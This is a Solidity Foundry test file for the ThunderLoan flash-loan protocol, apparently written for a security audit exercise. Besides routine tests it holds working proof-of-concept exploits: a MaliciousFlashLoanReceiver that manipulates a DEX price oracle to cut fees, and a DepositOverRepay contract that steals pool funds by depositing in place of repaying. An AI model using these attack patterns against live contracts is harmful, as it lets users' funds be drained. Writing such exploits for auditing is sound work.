// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { Test, console } from "forge-std/Test.sol";
import { BaseTest, ThunderLoan, ERC20Mock, ERC1967Proxy} from "./BaseTest.t.sol";
import { AssetToken } from "../../src/protocol/AssetToken.sol";
import { MockFlashLoanReceiver } from "../mocks/MockFlashLoanReceiver.sol";
import {BuffMockPoolFactory} from "../mocks/BuffMockPoolFactory.sol";
import {BuffMockTSwap} from "../mocks/BuffMockTSwap.sol";
import {IFlashLoanReceiver} from "../../src/interfaces/IFlashLoanReceiver.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ThunderLoanUpgraded} from "../../src/upgradedProtocol/ThunderLoanUpgraded.sol";

contract ThunderLoanTest is BaseTest {
    uint256 constant AMOUNT = 10e18;
    uint256 constant DEPOSIT_AMOUNT = AMOUNT * 100;
    address liquidityProvider = address(123);
    address user = address(456);
    MockFlashLoanReceiver mockFlashLoanReceiver;

    function setUp() public override {
        super.setUp();
        vm.prank(user);
        mockFlashLoanReceiver = new MockFlashLoanReceiver(address(thunderLoan));
    }

    function testInitializationOwner() public {
        assertEq(thunderLoan.owner(), address(this));
    }

    function testSetAllowedTokens() public {
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        assertEq(thunderLoan.isAllowedToken(tokenA), true);
    }

    function testOnlyOwnerCanSetTokens() public {
        vm.prank(liquidityProvider);
        vm.expectRevert();
        thunderLoan.setAllowedToken(tokenA, true);
    }

    function testSettingTokenCreatesAsset() public {
        vm.prank(thunderLoan.owner());
        AssetToken assetToken = thunderLoan.setAllowedToken(tokenA, true);
        assertEq(address(thunderLoan.getAssetFromToken(tokenA)), address(assetToken));
    }

    function testCantDepositUnapprovedTokens() public {
        tokenA.mint(liquidityProvider, AMOUNT);
        tokenA.approve(address(thunderLoan), AMOUNT);
        vm.expectRevert(abi.encodeWithSelector(ThunderLoan.ThunderLoan__NotAllowedToken.selector, address(tokenA)));
        thunderLoan.deposit(tokenA, AMOUNT);
    }

    modifier setAllowedToken() {
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        _;
    }

    function testDepositMintsAssetAndUpdatesBalance() public setAllowedToken {
        tokenA.mint(liquidityProvider, AMOUNT);

        vm.startPrank(liquidityProvider);
        tokenA.approve(address(thunderLoan), AMOUNT);
        thunderLoan.deposit(tokenA, AMOUNT);
        vm.stopPrank();

        AssetToken asset = thunderLoan.getAssetFromToken(tokenA);
        assertEq(tokenA.balanceOf(address(asset)), AMOUNT);
        assertEq(asset.balanceOf(liquidityProvider), AMOUNT);
    }

    modifier hasDeposits() {
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, DEPOSIT_AMOUNT);
        tokenA.approve(address(thunderLoan), DEPOSIT_AMOUNT);
        thunderLoan.deposit(tokenA, DEPOSIT_AMOUNT);
        vm.stopPrank();
        _;
    }

    function testFlashLoan() public setAllowedToken hasDeposits {
        uint256 amountToBorrow = AMOUNT * 10;
        uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
        vm.startPrank(user);
        tokenA.mint(address(mockFlashLoanReceiver), AMOUNT);
        thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
        vm.stopPrank();

        assertEq(mockFlashLoanReceiver.getBalanceDuring(), amountToBorrow + AMOUNT);
        assertEq(mockFlashLoanReceiver.getBalanceAfter(), AMOUNT - calculatedFee);
    }


    function testCantRedeemForLiquidators() public setAllowedToken hasDeposits {
        uint256 amountToBorrow = AMOUNT * 10;
        uint256 calculatedFee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
        vm.startPrank(user);
        tokenA.mint(address(mockFlashLoanReceiver), calculatedFee);
        thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
        vm.stopPrank();


        uint256 amountToRedeem = type(uint256).max;
        vm.expectRevert();
        vm.startPrank(liquidityProvider);
        thunderLoan.redeem(tokenA, amountToRedeem);
        vm.stopPrank();
    }


    function testUpgradeBreaks() public {
        uint256 feeBeforeUpgrade = thunderLoan.getFee();
        vm.startPrank(thunderLoan.owner());
        ThunderLoanUpgraded upgraded = new ThunderLoanUpgraded();
        thunderLoan.upgradeToAndCall(address(upgraded), "");
        uint256 feeAfterUpgrade = thunderLoan.getFee();
        vm.stopPrank();

        console.log("Fee before the uprade: ", feeBeforeUpgrade);
        console.log("Fee after the uprade: ", feeAfterUpgrade);
        assert(feeBeforeUpgrade < feeAfterUpgrade);
    }


    function testOracleManipulation() public {
        // 1. Set up contracts
        thunderLoan = new ThunderLoan();
        tokenA = new ERC20Mock();
        proxy = new ERC1967Proxy(address(thunderLoan), "");
        BuffMockPoolFactory pf = new BuffMockPoolFactory(address(weth));
        // Create pool WETH / TOKENA
        address pool = pf.createPool(address(tokenA));
        thunderLoan = ThunderLoan(address(proxy));
        thunderLoan.initialize(address(pf));

        // 2. Fund TSWAP
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, 100e18);
        tokenA.approve(pool, 100e18);
        weth.mint(liquidityProvider, 100e18);
        weth.approve(pool, 100e18);
        // Ratio 100 WETH = 100 tokenA
        // Price 1:1
        BuffMockTSwap(pool).deposit(100e18, 100e18, 100e18, block.timestamp);
        vm.stopPrank();
        
        // 3. Fund ThunderLoan
        //  Set and allow token
        vm.prank(thunderLoan.owner());
        thunderLoan.setAllowedToken(tokenA, true);
        //  Fund
        vm.startPrank(liquidityProvider);
        tokenA.mint(liquidityProvider, 1000e18);
        tokenA.approve(address(thunderLoan), 1000e18);
        thunderLoan.deposit(tokenA, 1000e18);
        vm.stopPrank();
        // We have right now 100 WETH / 100 tokenA on TSwap
        // 1000 tokenA in thunderLoan
        // Take out a flashloan of 50 tokenA
        // swap it on the DEX tanking the price > 150 tokenA -> ~80 WETH
        // Take out another flashloan of 50 tokenA (and we will see how much cheaper it is!).

        // 4. We are going to take out two flashloans
        //  a. One to nuke the price of the WETH / tokenA TSwap
        //  b. To show that doing so greatly reduces the fees we pay on thunderloan

        uint256 normalFeeCost100 = thunderLoan.getCalculatedFee(tokenA, 100e18);
        uint256 normalFeeCost50 = thunderLoan.getCalculatedFee(tokenA, 50e18);
        console.log("Normal Fee for 100e18 is: ", normalFeeCost100);
        console.log("Normal Fee for 50e18 is: ", normalFeeCost50);
        // 296147410319118389

        uint256 amountToBorrow = 50e18; // gonna do this twice
        MaliciousFlashLoanReceiver flr = new MaliciousFlashLoanReceiver(pool, address(thunderLoan), address(thunderLoan.getAssetFromToken(tokenA)));
        
        vm.startPrank(user);
        // MInt some tokens to the contract receiver to pay the fee
        tokenA.mint(address(flr), 100e18);
        thunderLoan.flashloan(address(flr), tokenA, amountToBorrow, "");
        vm.stopPrank();

        uint256 attackFee = flr.feeOne() + flr.feeTwo();
        console.log("Attack total fee is: ", attackFee);
        console.log("Attack fee one is: ", flr.feeOne());
        console.log("Attack fee two is: ", flr.feeTwo());
        assert(attackFee < normalFeeCost100);
    
    }


    function testDepositInsteadOfRepay() public setAllowedToken hasDeposits {
        vm.startPrank(user);
        uint256 amountToBorrow = 50e18;
        uint256 fee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
        DepositOverRepay dor = new DepositOverRepay(address(thunderLoan));
        tokenA.mint(address(dor), fee);
        thunderLoan.flashloan(address(dor), tokenA, amountToBorrow, "");
        dor.redeemMoney();
        console.log("Fee: ", fee);
        vm.stopPrank();

        // Is not going to be equal because we updated the exchange rate in the flashloan and deposit 
        // call function, so we going to get more than what we stole
        assert(tokenA.balanceOf(address(dor)) > 50e18 + fee);
        
    }
}


contract DepositOverRepay is IFlashLoanReceiver {
    ThunderLoan thunderLoan;
    AssetToken assetToken;
    address s_token;
    
    constructor(address _thunderLoan) {
        thunderLoan = ThunderLoan(_thunderLoan);
    }

    function executeOperation(address token, uint256 amount, uint256 fee, address /*initiator*/, bytes calldata /*params*/)
        external
        returns (bool) {
            s_token = token;
            assetToken = thunderLoan.getAssetFromToken(IERC20(token));
            IERC20(token).approve(address(thunderLoan), amount + fee);
            thunderLoan.deposit(IERC20(token), amount + fee);
            
            return true;
            
    }

    function redeemMoney() public {
        uint256 amount = assetToken.balanceOf(address(this));
        thunderLoan.redeem(IERC20(s_token), amount);
    }
}



// We have to make a separate contract to receive the flashloan and do the stuff manipulate the price oracle
// and get less fees from thunderloan
contract MaliciousFlashLoanReceiver is IFlashLoanReceiver {
    ThunderLoan thunderLoan;
    BuffMockTSwap tswapPool;
    address repayAddress;
    bool attacked;
    uint256 public feeOne;
    uint256 public feeTwo;
    
    constructor(address _tswapPool, address _thunderLoan, address _repayAddress) {
        tswapPool = BuffMockTSwap(_tswapPool);
        thunderLoan = ThunderLoan(_thunderLoan);
        repayAddress = _repayAddress;
    }

    function executeOperation(address token, uint256 amount, uint256 fee, address /*initiator*/, bytes calldata /*params*/)
        external
        returns (bool) {

            if (!attacked) {
                // Receive the flashloan and tank the price of TSwap with the flashloan
                // 2. Take out another flashLoan to see the difference
                feeOne = fee;
                attacked = true;
                uint256 wethBought = tswapPool.getOutputAmountBasedOnInput(50e18, 100e18, 100e18);
                IERC20(token).approve(address(tswapPool), 50e18);

                // We tank the price
                tswapPool.swapPoolTokenForWethBasedOnInputPoolToken(50e18, wethBought, block.timestamp);

                // We call second flashloan
                thunderLoan.flashloan(address(this), IERC20(token), amount, "");

                // repay
                // This mode doesn't work because we can't repay if we do two flashLoans on the same Token (Low bug)
                //IERC20(token).approve(address(thunderLoan), amount + fee);
                //thunderLoan.repay(IERC20(token), amount + fee);
                IERC20(token).transfer(repayAddress, amount + fee);
            } else {
                // Calculate the fee and repay
                feeTwo = fee;
                //IERC20(token).approve(address(thunderLoan), amount + fee);
                //thunderLoan.repay(IERC20(token), amount + fee);
                IERC20(token).transfer(repayAddress, amount + fee);
            }
            return true;
            
    }
}
